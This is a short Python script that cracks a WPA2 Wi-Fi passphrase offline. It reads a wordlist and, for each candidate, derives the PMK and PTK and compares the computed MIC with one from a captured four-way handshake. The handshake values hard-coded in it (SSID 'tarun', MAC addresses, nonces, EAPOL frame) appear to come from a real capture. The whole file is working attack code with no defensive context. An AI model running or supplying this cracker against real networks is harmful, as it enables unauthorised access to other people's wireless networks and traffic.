import hmac
import hashlib
import binascii
import sys

def customPRF512(key, A, B):
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A.encode() + chr(0x00).encode() + B + chr(i).encode(), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]



file_path = 'working wifi code\passphrases.txt'
ssid = "tarun"
A = "Pairwise key expansion"
APmac = binascii.a2b_hex("6A4AE98F5B10")
Clientmac = binascii.a2b_hex("DCF505550925")
ANonce = binascii.a2b_hex("3bc4478535a78107c57a28438288489f312f14609bd8fb15c9e3ff78dbb07432")
SNonce = binascii.a2b_hex("b8be6df5c3e5c0d7e8460c810b8175f9304d67ec6b35a437da431c3ec416debe")
B = min(APmac, Clientmac) + max(APmac, Clientmac) + min(ANonce, SNonce) + max(ANonce, SNonce)
data = binascii.a2b_hex("0103007502010a00000000000000000001b8be6df5c3e5c0d7e8460c810b8175f9304d67ec6b35a437da431c3ec416debe000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac040100000fac040100000fac020000")

desired_mic = binascii.a2b_hex("51fa068cbcda04e193473f3ca0486e14")

with open(file_path, 'r') as wordlist_file:
    for line in wordlist_file:
        passPhrase = line.strip()
        pmk = hashlib.pbkdf2_hmac("sha1", passPhrase.encode("utf-8"), ssid.encode("utf-8"), 4096, 32)
        ptk = customPRF512(pmk, A, B)
        mic = hmac.new(ptk[0:16], data, hashlib.sha1).digest()

        if mic[:16] == desired_mic:
            print("Passphrase found:", passPhrase)
            break
        else:
            print("Passphrase does not match:", passPhrase)

print("End of wordlist.")
